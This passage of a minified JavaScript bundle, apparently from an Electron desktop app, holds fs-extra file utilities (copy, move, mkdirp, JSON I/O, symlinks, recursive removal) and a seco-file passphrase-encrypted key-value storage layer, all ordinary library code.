				if (i === a) {
					if (h(t, n)) throw new Error(`Cannot copy '${t}' to a subdirectory of itself, '${n}'.`);
					return function(e, t, n) {
						if (!r.statSync(t).isDirectory()) throw new Error(`Cannot overwrite non-directory '${t}' with directory '${e}'.`);
						return d(e, t, n)
					}(t, n, o)
				}
				if (t === i) return;
				return d(t, n, o)
			}(i, e, t, n);
			if (i.isFile() || i.isCharacterDevice() || i.isBlockDevice()) return function(e, t, n, r) {
				const o = p(n);
				if (o === c) return f(e, t, n, r);
				if (o === a) return l(e, t, n, r);
				if (t === o) return;
				return l(e, t, n, r)
			}(i, e, t, n);
			if (i.isSymbolicLink()) return function(e, t, n) {
				let i = r.readlinkSync(e);
				n.dereference && (i = o.resolve(process.cwd(), i));
				let s = p(t);
				if (s === c || s === a) return r.symlinkSync(i, t);
				if (n.dereference && (s = o.resolve(process.cwd(), s)), s === i) return;
				if (r.statSync(t).isDirectory() && h(s, i)) throw new Error(`Cannot overwrite '${s}' with '${i}'.`);
				return function(e, t) {
					return r.unlinkSync(t), r.symlinkSync(e, t)
				}(i, t)
			}(e, t, n)
		}(e, t, n)
	}

	function l(e, t, n, o) {
		if (o.overwrite) return r.unlinkSync(n), f(e, t, n, o);
		if (o.errorOnExist) throw new Error(`'${n}' already exists`)
	}

	function f(e, t, o, i) {
		return "function" == typeof r.copyFileSync ? (r.copyFileSync(t, o), r.chmodSync(o, e.mode), i.preserveTimestamps ? s(o, e.atime, e.mtime) : void 0) : function(e, t, o, i) {
			const s = n(75)(65536),
				c = r.openSync(t, "r"),
				a = r.openSync(o, "w", e.mode);
			let u = 1,
				l = 0;
			for (; u > 0;) u = r.readSync(c, s, 0, 65536, l), r.writeSync(a, s, 0, u), l += u;
			i.preserveTimestamps && r.futimesSync(a, e.atime, e.mtime);
			r.closeSync(c), r.closeSync(a)
		}(e, t, o, i)
	}

	function d(e, t, n) {
		r.readdirSync(e).forEach(r => {
			u(o.join(e, r), o.join(t, r), n)
		})
	}

	function p(e) {
		let t;
		try {
			t = r.readlinkSync(e)
		} catch (e) {
			if ("ENOENT" === e.code) return c;
			if ("EINVAL" === e.code || "UNKNOWN" === e.code) return a;
			throw e
		}
		return t
	}

	function h(e, t) {
		const n = t.split(o.dirname(e) + o.sep)[1];
		if (n) {
			const r = n.split(o.sep)[0];
			return !!r && (e !== t && t.indexOf(e) > -1 && r === o.basename(e))
		}
		return !1
	}
	e.exports = function(e, t, n) {
		if ("function" == typeof n && (n = {
				filter: n
			}), (n = n || {}).clobber = !("clobber" in n && !n.clobber), n.overwrite = "overwrite" in n ? !!n.overwrite : n.clobber, n.preserveTimestamps && "ia32" === process.arch && console.warn("fs-extra: Using the preserveTimestamps option in 32-bit node is not recommended;\n\n    see https://github.com/jprichardson/node-fs-extra/issues/269"), (e = o.resolve(e)) === (t = o.resolve(t))) throw new Error("Source and destination must not be the same.");
		if (n.filter && !n.filter(e, t)) return;
		const s = o.dirname(t);
		return r.existsSync(s) || i(s), u(e, t, n)
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(1),
		i = n(78).invalidWin32Path,
		s = parseInt("0777", 8);
	e.exports = function e(t, n, c) {
		n && "object" == typeof n || (n = {
			mode: n
		});
		let a = n.mode;
		const u = n.fs || r;
		if ("win32" === process.platform && i(t)) {
			const e = new Error(t + " contains invalid WIN32 path characters.");
			throw e.code = "EINVAL", e
		}
		void 0 === a && (a = s & ~process.umask()), c || (c = null), t = o.resolve(t);
		try {
			u.mkdirSync(t, a), c = c || t
		} catch (r) {
			switch (r.code) {
				case "ENOENT":
					if (o.dirname(t) === t) throw r;
					c = e(o.dirname(t), n, c), e(t, n, c);
					break;
				default:
					let i;
					try {
						i = u.statSync(t)
					} catch (e) {
						throw r
					}
					if (!i.isDirectory()) throw r
			}
		}
		return c
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(1),
		i = n(78).invalidWin32Path,
		s = parseInt("0777", 8);
	e.exports = function e(t, n, c, a) {
		if ("function" == typeof n ? (c = n, n = {}) : n && "object" == typeof n || (n = {
				mode: n
			}), "win32" === process.platform && i(t)) {
			const e = new Error(t + " contains invalid WIN32 path characters.");
			return e.code = "EINVAL", c(e)
		}
		let u = n.mode;
		const l = n.fs || r;
		void 0 === u && (u = s & ~process.umask()), a || (a = null), c = c || function() {}, t = o.resolve(t), l.mkdir(t, u, r => {
			if (!r) return c(null, a = a || t);
			switch (r.code) {
				case "ENOENT":
					if (o.dirname(t) === t) return c(r);
					e(o.dirname(t), n, (r, o) => {
						r ? c(r, o) : e(t, n, c, o)
					});
					break;
				default:
					l.stat(t, (e, t) => {
						e || !t.isDirectory() ? c(r, a) : c(null, a)
					})
			}
		})
	}
}, function(e, t, n) {
	const r = n(16).fromCallback;
	e.exports = {
		copy: r(n(79))
	}
}, function(e, t, n) {
	"use strict";
	e.exports = function() {
		const e = [].slice.call(arguments).filter(e => e),
			t = e.shift();
		return e.forEach(e => {
			Object.keys(e).forEach(n => {
				t[n] = e[n]
			})
		}), t
	}
}, function(e, t, n) {
	"use strict";
	const r = n(145),
		o = {};
	r(o, n(80)), r(o, n(144)), r(o, n(76)), r(o, n(19)), r(o, n(49)), r(o, n(139)), r(o, n(135)), r(o, n(134)), r(o, n(133)), r(o, n(132)), r(o, n(126)), r(o, n(31)), e.exports = o
}, function(e, t, n) {
	"use strict";
	Object.defineProperty(t, "__esModule", {
		value: !0
	}), t.read = t.write = void 0;
	var r = Object.assign || function(e) {
		for (var t = 1; t < arguments.length; t++) {
			var n = arguments[t];
			for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
		}
		return e
	};
	t.write = (o = y(function*(e, t, n = {}) {
		if (!(n = r({
				overwrite: !1
			}, n)).overwrite && (yield a.default.pathExists(e))) throw new Error(`${e} exists. Set 'overwrite' to true.`);
		var o = m(t, n);
		const i = o.encryptedData,
			s = o.blobKey,
			c = o.metadata;
		return yield a.default.outputFile(e, i), {
			blobKey: s,
			metadata: c
		}
	}), function(e, t) {
		return o.apply(this, arguments)
	});
	var o;
	t.read = (i = y(function*(e, t) {
		let n, r = yield a.default.readFile(e);
		try {
			n = w(r, t)
		} catch (t) {
			if (t.message.match(/seco checksum does not match; data may be corrupted/)) throw new Error(`${e}: seco checksum does not match; file may be corrupted`);
			throw t
		}
		return n
	}), function(e, t) {
		return i.apply(this, arguments)
	});
	var i;
	t.encryptData = m, t.decryptData = w;
	var s, c = n(146),
		a = (s = c) && s.__esModule ? s : {
			default: s
		},
		u = h(n(28)),
		l = h(n(125)),
		f = h(n(74)),
		d = h(n(71)),
		p = h(n(114));

	function h(e) {
		if (e && e.__esModule) return e;
		var t = {};
		if (null != e)
			for (var n in e) Object.prototype.hasOwnProperty.call(e, n) && (t[n] = e[n]);
		return t.default = e, t
	}

	function y(e) {
		return function() {
			var t = e.apply(this, arguments);
			return new Promise(function(e, n) {
				return function r(o, i) {
					try {
						var s = t[o](i),
							c = s.value
					} catch (e) {
						return void n(e)
					}
					if (!s.done) return Promise.resolve(c).then(function(e) {
						r("next", e)
					}, function(e) {
						r("throw", e)
					});
					e(c)
				}("next")
			})
		}
	}

	function m(e, t = {}) {
		t.header || console.warn("seco-file: should pass options.header.");
		let n, r, o = f.create(t.header);
		if (t.passphrase) n = u.randomBytes(32), r = d.create(), d.encryptBlobKey(r, t.passphrase, n);
		else {
			if (!t.metadata || !t.blobKey) throw new Error("Must set either passphrase or (metadata and blobKey)");
			n = t.blobKey, r = t.metadata
		}
		e = Buffer.isBuffer(e) ? e : Buffer.from(e, "utf8");
		let i = l.encrypt(e, r, n).blob;
		const s = f.serialize(o),
			c = d.serialize(r);
		let a = {
			header: s,
			checksum: p.computeChecksum(c, i),
			metadata: c,
			blob: i
		};
		return {
			encryptedData: p.encode(a),
			blobKey: n,
			metadata: r
		}
	}

	function w(e, t) {
		const n = p.decode(e),
			r = p.computeChecksum(n.metadata, n.blob);
		if (!n.checksum.equals(r)) throw new Error("seco checksum does not match; data may be corrupted");
		let o = d.decode(n.metadata),
			i = d.decryptBlobKey(o, t),
			s = f.decode(n.header);
		return {
			data: l.decrypt(n.blob, o, i),
			blobKey: i,
			metadata: o,
			header: s
		}
	}
}, function(e, t, n) {
	"use strict";
	Object.defineProperty(t, "__esModule", {
		value: !0
	}), t.default = function(e, t, n) {
		let i, s, c = !1;
		return {
			write: a => o(function*() {
				if (c) throw new Error("seco-writer class has been destroyed, create a new one");
				if (s) yield r.write(e, a, {
					metadata: s,
					blobKey: i,
					overwrite: !0,
					header: n
				});
				else {
					const o = yield r.write(e, a, {
						passphrase: t,
						overwrite: !0,
						header: n
					});
					i = o.blobKey, s = o.metadata
				}
			})(),
			read: () => o(function*() {
				if (c) throw new Error("seco-writer class has been destroyed, create a new one");
				const n = yield r.read(e, t);
				return i = n.blobKey, s = n.metadata, n.data
			})(),
			destroy() {
				c = !0, i && i.fill(0)
			}
		}
	};
	var r = function(e) {
		if (e && e.__esModule) return e;
		var t = {};
		if (null != e)
			for (var n in e) Object.prototype.hasOwnProperty.call(e, n) && (t[n] = e[n]);
		return t.default = e, t
	}(n(147));

	function o(e) {
		return function() {
			var t = e.apply(this, arguments);
			return new Promise(function(e, n) {
				return function r(o, i) {
					try {
						var s = t[o](i),
							c = s.value
					} catch (e) {
						return void n(e)
					}
					if (!s.done) return Promise.resolve(c).then(function(e) {
						r("next", e)
					}, function(e) {
						r("throw", e)
					});
					e(c)
				}("next")
			})
		}
	}
}, function(e, t, n) {
	const r = n(9),
		{
			gzipSync: o,
			gunzipSync: i
		} = n(65),
		s = n(148).default,
		c = n(112),
		a = n(111),
		u = n(110),
		l = n(109),
		{
			getLockFile: f
		} = n(70),
		{
			expand: d,
			shrink: p
		} = c(32768);
	e.exports = {
		createStorageInternal: function({
			file: e,
			getSecoPassphrase: t,
			header: n,
			expandTo32k: c = !1
		}) {
			const l = f(e);
			let h, y;
			const m = async function() {
				const r = await t();
				h = s(e, r, n);
				try {
					let e = await h.read();
					c && (e = p(e)), y = JSON.parse(i(e).toString("utf8"))
				} catch (e) {
					if ("ENOENT" !== e.code) throw e;
					let t = o(Buffer.from(JSON.stringify({})));
					c && (t = d(t)), await h.write(t), y = {}
				}
			}();
			let w = !1;
			const b = a(async () => {
					if (w) {
						await u(100);
						try {
							let e = o(Buffer.from(JSON.stringify(y)));
							c && (e = d(e)), w = !1, await h.write(e)
						} finally {
							w || await r.remove(l)
						}
					}
				}, {
					concurrency: 1
				}),
				g = async () => {
					w = !0, await r.outputFile(l, ""), await b()
				};
			return {
				get: async e => (await m, y[e]),
				batchGet: async e => (await m, e.map(e => y[e])),
				set: async (e, t) => {
					if (await m, void 0 === t) throw new Error(`cannot set ${e} to undefined`);
					y[e] = t, await g()
				},
				batchSet: async e => {
					await m, Object.entries(e).forEach(([e, t]) => {
						if (void 0 === t) throw new Error(`cannot set ${e} to undefined`);
						y[e] = t
					}), await g()
				},
				delete: async e => {
					await m, delete y[e], await g()
				},
				batchDelete: async e => {
					await m, e.forEach(e => delete y[e]), await g()
				},
				clear: async e => {
					await m, Object.keys(y).forEach(t => {
						t.startsWith(e) && delete y[t]
					}), await g()
				}
			}
		},
		restrictToNamespaces: function(e, t) {
			const n = t.map(e => (Array.isArray(e) || (e = [e]), e.map(e => {
					if ("string" != typeof e || e.includes("!")) throw new Error(`invalid namespace segment ${e}`);
					return `!${e}!`
				}).join(""))),
				r = e => e && "string" == typeof e && n.some(t => e.startsWith(t)),
				o = e => {
					if (r(e)) return e;
					throw new Error(`not permitted to access this namespace; tried to access key ${e}`)
				};
			return {
				get: async t => e.get(o(t)),
				batchGet: async t => e.batchGet(t.map(e => o(e))),
				set: async (t, n) => e.set(o(t), n),
				batchSet: async t => e.batchSet(Object.fromEntries(Object.entries(t).map(([e, t]) => [o(e), t]))),
				delete: async t => e.delete(o(t)),
				batchDelete: async t => e.batchDelete(t.map(e => o(e))),
				clear: async t => {
					if (r(t)) return e.clear(t);
					throw new Error(`not permitted to access this namespace; tried to clear ${t||"root-level storage"}`)
				}
			}
		},
		addNamespacing: l
	}
}, function(e, t) {
	var n = "[object Arguments]" == function() {
		return Object.prototype.toString.call(arguments)
	}();

	function r(e) {
		return "[object Arguments]" == Object.prototype.toString.call(e)
	}

	function o(e) {
		return e && "object" == typeof e && "number" == typeof e.length && Object.prototype.hasOwnProperty.call(e, "callee") && !Object.prototype.propertyIsEnumerable.call(e, "callee") || !1
	}(t = e.exports = n ? r : o).supported = r, t.unsupported = o
}, function(e, t, n) {
	(e.exports = Object.keys).shim = function(e) {
		var t = [];
		for (var n in e) t.push(n);
		return t
	}
}, function(e, t, n) {
	var r = Array.prototype.slice,
		o = n(151),
		i = n(150),
		s = e.exports = function(e, t, n) {
			return n || (n = {}), e === t || (e instanceof Date && t instanceof Date ? e.getTime() === t.getTime() : !e || !t || "object" != typeof e && "object" != typeof t ? n.strict ? e === t : e == t : function(e, t, n) {
				var u, l;
				if (c(e) || c(t)) return !1;
				if (e.prototype !== t.prototype) return !1;
				if (i(e)) return !!i(t) && (e = r.call(e), t = r.call(t), s(e, t, n));
				if (a(e)) {
					if (!a(t)) return !1;
					if (e.length !== t.length) return !1;
					for (u = 0; u < e.length; u++)
						if (e[u] !== t[u]) return !1;
					return !0
				}
				try {
					var f = o(e),
						d = o(t)
				} catch (e) {
					return !1
				}
				if (f.length != d.length) return !1;
				for (f.sort(), d.sort(), u = f.length - 1; u >= 0; u--)
					if (f[u] != d[u]) return !1;
				for (u = f.length - 1; u >= 0; u--)
					if (l = f[u], !s(e[l], t[l], n)) return !1;
				return typeof e == typeof t
			}(e, t, n))
		};

	function c(e) {
		return null == e
	}

	function a(e) {
		return !(!e || "object" != typeof e || "number" != typeof e.length) && ("function" == typeof e.copy && "function" == typeof e.slice && !(e.length > 0 && "number" != typeof e[0]))
	}
}, function(e, t, n) {
	var r = n(1),
		o = n(27),
		i = parseInt("0777", 8);

	function s(e, t, n, c) {
		"function" == typeof t ? (n = t, t = {}) : t && "object" == typeof t || (t = {
			mode: t
		});
		var a = t.mode,
			u = t.fs || o;
		void 0 === a && (a = i & ~process.umask()), c || (c = null);
		var l = n || function() {};
		e = r.resolve(e), u.mkdir(e, a, function(n) {
			if (!n) return l(null, c = c || e);
			switch (n.code) {
				case "ENOENT":
					if (r.dirname(e) === e) return l(n);
					s(r.dirname(e), t, function(n, r) {
						n ? l(n, r) : s(e, t, l, r)
					});
					break;
				default:
					u.stat(e, function(e, t) {
						e || !t.isDirectory() ? l(n, c) : l(null, c)
					})
			}
		})
	}
	e.exports = s.mkdirp = s.mkdirP = s, s.sync = function e(t, n, s) {
		n && "object" == typeof n || (n = {
			mode: n
		});
		var c = n.mode,
			a = n.fs || o;
		void 0 === c && (c = i & ~process.umask()), s || (s = null), t = r.resolve(t);
		try {
			a.mkdirSync(t, c), s = s || t
		} catch (o) {
			switch (o.code) {
				case "ENOENT":
					s = e(r.dirname(t), n, s), e(t, n, s);
					break;
				default:
					var u;
					try {
						u = a.statSync(t)
					} catch (e) {
						throw o
					}
					if (!u.isDirectory()) throw o
			}
		}
		return s
	}
}, function(e, t, n) {
	var r;
	try {
		r = n(7)
	} catch (e) {
		r = n(27)
	}

	function o(e) {
		return Buffer.isBuffer(e) && (e = e.toString("utf8")), e = e.replace(/^\uFEFF/, "")
	}
	var i = {
		spaces: null,
		readFile: function(e, t, n) {
			null == n && (n = t, t = {}), "string" == typeof t && (t = {
				encoding: t
			});
			var i = (t = t || {}).fs || r,
				s = !0;
			"passParsingErrors" in t ? s = t.passParsingErrors : "throws" in t && (s = t.throws), i.readFile(e, t, function(r, i) {
				if (r) return n(r);
				var c;
				i = o(i);
				try {
					c = JSON.parse(i, t ? t.reviver : null)
				} catch (t) {
					return s ? (t.message = e + ": " + t.message, n(t)) : n(null, null)
				}
				n(null, c)
			})
		},
		readFileSync: function(e, t) {
			"string" == typeof(t = t || {}) && (t = {
				encoding: t
			});
			var n = t.fs || r,
				i = !0;
			"passParsingErrors" in t ? i = t.passParsingErrors : "throws" in t && (i = t.throws);
			var s = n.readFileSync(e, t);
			s = o(s);
			try {
				return JSON.parse(s, t.reviver)
			} catch (t) {
				if (i) throw t.message = e + ": " + t.message, t;
				return null
			}
		},
		writeFile: function(e, t, n, o) {
			null == o && (o = n, n = {});
			var i = (n = n || {}).fs || r,
				s = "object" == typeof n && null !== n && "spaces" in n ? n.spaces : this.spaces,
				c = "";
			try {
				c = JSON.stringify(t, n ? n.replacer : null, s) + "\n"
			} catch (e) {
				if (o) return o(e, null)
			}
			i.writeFile(e, c, n, o)
		},
		writeFileSync: function(e, t, n) {
			var o = (n = n || {}).fs || r,
				i = "object" == typeof n && null !== n && "spaces" in n ? n.spaces : this.spaces,
				s = JSON.stringify(t, n.replacer, i) + "\n";
			return o.writeFileSync(e, s, n)
		}
	};
	e.exports = i
}, function(e, t) {
	e.exports = require("fs/promises")
}, function(e, t, n) {
	"use strict";
	n.r(t), n.d(t, "dataDir", function() {
		return o
	}), n.d(t, "desktopDir", function() {
		return i
	});
	var r = n(0);

	function o() {
		return r.app.getPath("userData")
	}

	function i() {
		return r.app.getPath("desktop")
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(1),
		i = n(63).copySync,
		s = n(50).removeSync,
		c = n(22).mkdirpSync,
		a = n(42);

	function u(e, t, n) {
		try {
			r.renameSync(e, t)
		} catch (r) {
			if ("EXDEV" !== r.code) throw r;
			return function(e, t, n) {
				return i(e, t, {
					overwrite: n,
					errorOnExist: !0
				}), s(e)
			}(e, t, n)
		}
	}
	e.exports = function(e, t, n) {
		const i = (n = n || {}).overwrite || n.clobber || !1,
			{
				srcStat: l,
				isChangingCase: f = !1
			} = a.checkPathsSync(e, t, "move", n);
		return a.checkParentPathsSync(e, l, t, "move"),
			function(e) {
				const t = o.dirname(e);
				return o.parse(t).root === t
			}(t) || c(o.dirname(t)),
			function(e, t, n, o) {
				if (o) return u(e, t, n);
				if (n) return s(t), u(e, t, n);
				if (r.existsSync(t)) throw new Error("dest already exists.");
				return u(e, t, n)
			}(e, t, i, f)
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(1),
		i = n(63).copy,
		s = n(50).remove,
		c = n(22).mkdirp,
		a = n(36).pathExists,
		u = n(42);

	function l(e, t, n, r, o) {
		return r ? f(e, t, n, o) : n ? s(t, r => r ? o(r) : f(e, t, n, o)) : void a(t, (r, i) => r ? o(r) : i ? o(new Error("dest already exists.")) : f(e, t, n, o))
	}

	function f(e, t, n, o) {
		r.rename(e, t, r => r ? "EXDEV" !== r.code ? o(r) : function(e, t, n, r) {
			i(e, t, {
				overwrite: n,
				errorOnExist: !0
			}, t => t ? r(t) : s(e, r))
		}(e, t, n, o) : o())
	}
	e.exports = function(e, t, n, r) {
		"function" == typeof n && (r = n, n = {});
		const i = (n = n || {}).overwrite || n.clobber || !1;
		u.checkPaths(e, t, "move", n, (n, s) => {
			if (n) return r(n);
			const {
				srcStat: a,
				isChangingCase: f = !1
			} = s;
			u.checkParentPaths(e, a, t, "move", n => n ? r(n) : function(e) {
				const t = o.dirname(e);
				return o.parse(t).root === t
			}(t) ? l(e, t, i, f, r) : void c(o.dirname(t), n => n ? r(n) : l(e, t, i, f, r)))
		})
	}
}, function(e, t, n) {
	"use strict";
	const r = n(17).fromCallback;
	e.exports = {
		move: r(n(158)),
		moveSync: n(157)
	}
}, function(e, t, n) {
	"use strict";
	const {
		stringify: r
	} = n(62), {
		outputFileSync: o
	} = n(61);
	e.exports = function(e, t, n) {
		const i = r(t, n);
		o(e, i, n)
	}
}, function(e, t, n) {
	"use strict";
	const {
		stringify: r
	} = n(62), {
		outputFile: o
	} = n(61);
	e.exports = async function(e, t, n = {}) {
		const i = r(t, n);
		await o(e, i, n)
	}
}, function(e, t, n) {
	let r;
	try {
		r = n(7)
	} catch (e) {
		r = n(27)
	}
	const o = n(17),
		{
			stringify: i,
			stripBom: s
		} = n(62);
	const c = {
		readFile: o.fromPromise(async function(e, t = {}) {
			"string" == typeof t && (t = {
				encoding: t
			});
			const n = t.fs || r,
				i = !("throws" in t) || t.throws;
			let c, a = await o.fromCallback(n.readFile)(e, t);
			a = s(a);
			try {
				c = JSON.parse(a, t ? t.reviver : null)
			} catch (t) {
				if (i) throw t.message = `${e}: ${t.message}`, t;
				return null
			}
			return c
		}),
		readFileSync: function(e, t = {}) {
			"string" == typeof t && (t = {
				encoding: t
			});
			const n = t.fs || r,
				o = !("throws" in t) || t.throws;
			try {
				let r = n.readFileSync(e, t);
				return r = s(r), JSON.parse(r, t.reviver)
			} catch (t) {
				if (o) throw t.message = `${e}: ${t.message}`, t;
				return null
			}
		},
		writeFile: o.fromPromise(async function(e, t, n = {}) {
			const s = n.fs || r,
				c = i(t, n);
			await o.fromCallback(s.writeFile)(e, c, n)
		}),
		writeFileSync: function(e, t, n = {}) {
			const o = n.fs || r,
				s = i(t, n);
			return o.writeFileSync(e, s, n)
		}
	};
	e.exports = c
}, function(e, t, n) {
	"use strict";
	const r = n(162);
	e.exports = {
		readJson: r.readFile,
		readJsonSync: r.readFileSync,
		writeJson: r.writeFile,
		writeJsonSync: r.writeFileSync
	}
}, function(e, t, n) {
	"use strict";
	const r = n(17).fromPromise,
		o = n(163);
	o.outputJson = r(n(161)), o.outputJsonSync = n(160), o.outputJSON = o.outputJson, o.outputJSONSync = o.outputJsonSync, o.writeJSON = o.writeJson, o.writeJSONSync = o.writeJsonSync, o.readJSON = o.readJson, o.readJSONSync = o.readJsonSync, e.exports = o
}, function(e, t, n) {
	"use strict";
	const r = n(7);
	e.exports = {
		symlinkType: function(e, t, n) {
			if (n = "function" == typeof t ? t : n, t = "function" != typeof t && t) return n(null, t);
			r.lstat(e, (e, r) => {
				if (e) return n(null, "file");
				t = r && r.isDirectory() ? "dir" : "file", n(null, t)
			})
		},
		symlinkTypeSync: function(e, t) {
			let n;
			if (t) return t;
			try {
				n = r.lstatSync(e)
			} catch {
				return "file"
			}
			return n && n.isDirectory() ? "dir" : "file"
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(1),
		o = n(7),
		i = n(36).pathExists;
	e.exports = {
		symlinkPaths: function(e, t, n) {
			if (r.isAbsolute(e)) return o.lstat(e, t => t ? (t.message = t.message.replace("lstat", "ensureSymlink"), n(t)) : n(null, {
				toCwd: e,
				toDst: e
			})); {
				const s = r.dirname(t),
					c = r.join(s, e);
				return i(c, (t, i) => t ? n(t) : i ? n(null, {
					toCwd: c,
					toDst: e
				}) : o.lstat(e, t => t ? (t.message = t.message.replace("lstat", "ensureSymlink"), n(t)) : n(null, {
					toCwd: e,
					toDst: r.relative(s, e)
				})))
			}
		},
		symlinkPathsSync: function(e, t) {
			let n;
			if (r.isAbsolute(e)) {
				if (!(n = o.existsSync(e))) throw new Error("absolute srcpath does not exist");
				return {
					toCwd: e,
					toDst: e
				}
			} {
				const i = r.dirname(t),
					s = r.join(i, e);
				if (n = o.existsSync(s)) return {
					toCwd: s,
					toDst: e
				};
				if (!(n = o.existsSync(e))) throw new Error("relative srcpath does not exist");
				return {
					toCwd: e,
					toDst: r.relative(i, e)
				}
			}
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(17).fromCallback,
		o = n(1),
		i = n(43),
		s = n(22),
		c = s.mkdirs,
		a = s.mkdirsSync,
		u = n(166),
		l = u.symlinkPaths,
		f = u.symlinkPathsSync,
		d = n(165),
		p = d.symlinkType,
		h = d.symlinkTypeSync,
		y = n(36).pathExists,
		{
			areIdentical: m
		} = n(42);

	function w(e, t, n, r) {
		l(e, t, (s, a) => {
			if (s) return r(s);
			e = a.toDst, p(a.toCwd, n, (n, s) => {
				if (n) return r(n);
				const a = o.dirname(t);
				y(a, (n, o) => n ? r(n) : o ? i.symlink(e, t, s, r) : void c(a, n => {
					if (n) return r(n);
					i.symlink(e, t, s, r)
				}))
			})
		})
	}
	e.exports = {
		createSymlink: r(function(e, t, n, r) {
			r = "function" == typeof n ? n : r, n = "function" != typeof n && n, i.lstat(t, (o, s) => {
				!o && s.isSymbolicLink() ? Promise.all([i.stat(e), i.stat(t)]).then(([o, i]) => {
					if (m(o, i)) return r(null);
					w(e, t, n, r)
				}) : w(e, t, n, r)
			})
		}),
		createSymlinkSync: function(e, t, n) {
			let r;
			try {
				r = i.lstatSync(t)
			} catch {}
			if (r && r.isSymbolicLink()) {
				const n = i.statSync(e),
					r = i.statSync(t);
				if (m(n, r)) return
			}
			const s = f(e, t);
			e = s.toDst, n = h(s.toCwd, n);
			const c = o.dirname(t);
			return i.existsSync(c) ? i.symlinkSync(e, t, n) : (a(c), i.symlinkSync(e, t, n))
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(17).fromCallback,
		o = n(1),
		i = n(7),
		s = n(22),
		c = n(36).pathExists,
		{
			areIdentical: a
		} = n(42);
	e.exports = {
		createLink: r(function(e, t, n) {
			function r(e, t) {
				i.link(e, t, e => {
					if (e) return n(e);
					n(null)
				})
			}
			i.lstat(t, (u, l) => {
				i.lstat(e, (i, u) => {
					if (i) return i.message = i.message.replace("lstat", "ensureLink"), n(i);
					if (l && a(u, l)) return n(null);
					const f = o.dirname(t);
					c(f, (o, i) => o ? n(o) : i ? r(e, t) : void s.mkdirs(f, o => {
						if (o) return n(o);
						r(e, t)
					}))
				})
			})
		}),
		createLinkSync: function(e, t) {
			let n;
			try {
				n = i.lstatSync(t)
			} catch {}
			try {
				const t = i.lstatSync(e);
				if (n && a(t, n)) return
			} catch (e) {
				throw e.message = e.message.replace("lstat", "ensureLink"), e
			}
			const r = o.dirname(t);
			return i.existsSync(r) ? i.linkSync(e, t) : (s.mkdirsSync(r), i.linkSync(e, t))
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(17).fromCallback,
		o = n(1),
		i = n(7),
		s = n(22);
	e.exports = {
		createFile: r(function(e, t) {
			function n() {
				i.writeFile(e, "", e => {
					if (e) return t(e);
					t()
				})
			}
			i.stat(e, (r, c) => {
				if (!r && c.isFile()) return t();
				const a = o.dirname(e);
				i.stat(a, (e, r) => {
					if (e) return "ENOENT" === e.code ? s.mkdirs(a, e => {
						if (e) return t(e);
						n()
					}) : t(e);
					r.isDirectory() ? n() : i.readdir(a, e => {
						if (e) return t(e)
					})
				})
			})
		}),
		createFileSync: function(e) {
			let t;
			try {
				t = i.statSync(e)
			} catch {}
			if (t && t.isFile()) return;
			const n = o.dirname(e);
			try {
				i.statSync(n).isDirectory() || i.readdirSync(n)
			} catch (e) {
				if (!e || "ENOENT" !== e.code) throw e;
				s.mkdirsSync(n)
			}
			i.writeFileSync(e, "")
		}
	}
}, function(e, t, n) {
	"use strict";
	const {
		createFile: r,
		createFileSync: o
	} = n(169), {
		createLink: i,
		createLinkSync: s
	} = n(168), {
		createSymlink: c,
		createSymlinkSync: a
	} = n(167);
	e.exports = {
		createFile: r,
		createFileSync: o,
		ensureFile: r,
		ensureFileSync: o,
		createLink: i,
		createLinkSync: s,
		ensureLink: i,
		ensureLinkSync: s,
		createSymlink: c,
		createSymlinkSync: a,
		ensureSymlink: c,
		ensureSymlinkSync: a
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(1),
		i = n(64),
		s = "win32" === process.platform;

	function c(e) {
		["unlink", "chmod", "stat", "lstat", "rmdir", "readdir"].forEach(t => {
			e[t] = e[t] || r[t], e[t += "Sync"] = e[t] || r[t]
		}), e.maxBusyTries = e.maxBusyTries || 3
	}

	function a(e, t, n) {
		let r = 0;
		"function" == typeof t && (n = t, t = {}), i(e, "rimraf: missing path"), i.strictEqual(typeof e, "string", "rimraf: path should be a string"), i.strictEqual(typeof n, "function", "rimraf: callback function required"), i(t, "rimraf: invalid options argument provided"), i.strictEqual(typeof t, "object", "rimraf: options should be object"), c(t), u(e, t, function o(i) {
			if (i) {
				if (("EBUSY" === i.code || "ENOTEMPTY" === i.code || "EPERM" === i.code) && r < t.maxBusyTries) {
					return r++, setTimeout(() => u(e, t, o), 100 * r)
				}
				"ENOENT" === i.code && (i = null)
			}
			n(i)
		})
	}

	function u(e, t, n) {
		i(e), i(t), i("function" == typeof n), t.lstat(e, (r, o) => r && "ENOENT" === r.code ? n(null) : r && "EPERM" === r.code && s ? l(e, t, r, n) : o && o.isDirectory() ? d(e, t, r, n) : void t.unlink(e, r => {
			if (r) {
				if ("ENOENT" === r.code) return n(null);
				if ("EPERM" === r.code) return s ? l(e, t, r, n) : d(e, t, r, n);
				if ("EISDIR" === r.code) return d(e, t, r, n)
			}
			return n(r)
		}))
	}

	function l(e, t, n, r) {
		i(e), i(t), i("function" == typeof r), t.chmod(e, 438, o => {
			o ? r("ENOENT" === o.code ? null : n) : t.stat(e, (o, i) => {
				o ? r("ENOENT" === o.code ? null : n) : i.isDirectory() ? d(e, t, n, r) : t.unlink(e, r)
			})
		})
	}

	function f(e, t, n) {
		let r;
		i(e), i(t);
		try {
			t.chmodSync(e, 438)
		} catch (e) {
			if ("ENOENT" === e.code) return;
			throw n
		}
		try {
			r = t.statSync(e)
		} catch (e) {
			if ("ENOENT" === e.code) return;
			throw n
		}
		r.isDirectory() ? h(e, t, n) : t.unlinkSync(e)
	}

	function d(e, t, n, r) {
		i(e), i(t), i("function" == typeof r), t.rmdir(e, s => {
			!s || "ENOTEMPTY" !== s.code && "EEXIST" !== s.code && "EPERM" !== s.code ? s && "ENOTDIR" === s.code ? r(n) : r(s) : function(e, t, n) {
				i(e), i(t), i("function" == typeof n), t.readdir(e, (r, i) => {
					if (r) return n(r);
					let s, c = i.length;
					if (0 === c) return t.rmdir(e, n);
					i.forEach(r => {
						a(o.join(e, r), t, r => {
